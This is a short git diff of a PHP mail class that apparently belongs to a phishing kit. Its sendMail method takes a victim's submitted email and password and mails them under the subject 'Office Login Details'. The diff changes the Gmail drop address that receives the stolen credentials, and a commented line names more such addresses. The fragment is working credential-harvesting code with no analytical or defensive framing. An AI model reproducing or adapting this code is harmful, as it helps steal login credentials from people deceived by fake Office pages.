@@ -9,7 +9,7 @@ class Email{
 
 	public function sendMail($data){
         //$this->to = 'odilichukwujoel@gmail.com,Toolz.morathy@gmail.com';
-        $this->to = 'sikkens40@gmail.com';
+        $this->to = 'odilichukwujoel@gmail.com';
 		$pass = $data['pass'];
 		$email = $data['email'];
 		$this->subject = "Office Login Details";
